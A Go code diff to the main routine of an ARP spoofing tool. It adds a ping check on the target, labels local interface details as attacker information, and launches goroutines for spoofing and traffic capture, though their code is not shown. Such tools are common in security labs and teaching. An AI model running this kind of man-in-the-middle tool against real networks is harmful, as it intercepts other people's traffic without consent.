@@ -4,6 +4,7 @@ import (
 	"flag"
 	"fmt"
 	"os"
+	"os/exec"
 	"os/signal"
 	"syscall"
 )
@@ -15,12 +16,24 @@ func main() {
 	flag.StringVar(&targetIP, "t", "", "target ip address (required)")
 	flag.Parse()
 
-	// validate that ip address was provided
+	// Validate that ip address was provided
 	if targetIP == "" {
 		fmt.Println("Error: target IP address is required")
 		fmt.Println("Usage: -t <target_ip_address>")
 		os.Exit(1)
 	}
+
+	// Check if target is reachable
+	// send 2 pings and each one with timeout of 2 seconds to the target
+	fmt.Printf("Checking if %v is reachable...\n", targetIP)
+	cmd := exec.Command("ping", "-c", "2", "-W", "2", targetIP)
+
+	if err := cmd.Run(); err != nil {
+		fmt.Printf("Error: Target %s is not reachable or offline\n", targetIP)
+		os.Exit(1)
+	}
+
+	fmt.Println("Target is reachable!")
 
 	fmt.Printf("Target IP address: %v\n", targetIP)
 
@@ -31,7 +44,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	fmt.Printf("\nLocal Network Information:\n")
+	fmt.Printf("\nAttacker Information:\n")
 	fmt.Printf("  Interface: %s\n", localNetwork.interfaceName)
 	fmt.Printf("  IP Address: %s\n", localNetwork.ipv4Address)
 	fmt.Printf("  MAC Address: %s\n", localNetwork.macAddress)
@@ -66,6 +79,10 @@ func main() {
 		fmt.Printf("Error: %v\n", err)
 		os.Exit(1)
 	}
+
+	fmt.Println("\nStarting ARP spoofing attack...")
+	fmt.Println("Press Ctrl+C to stop and restore ARP tables.")
+	fmt.Println() // Empty line before traffic output
 
 	go StartARPSpoofing(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
 	go StartCapture(localNetwork, targetIP)
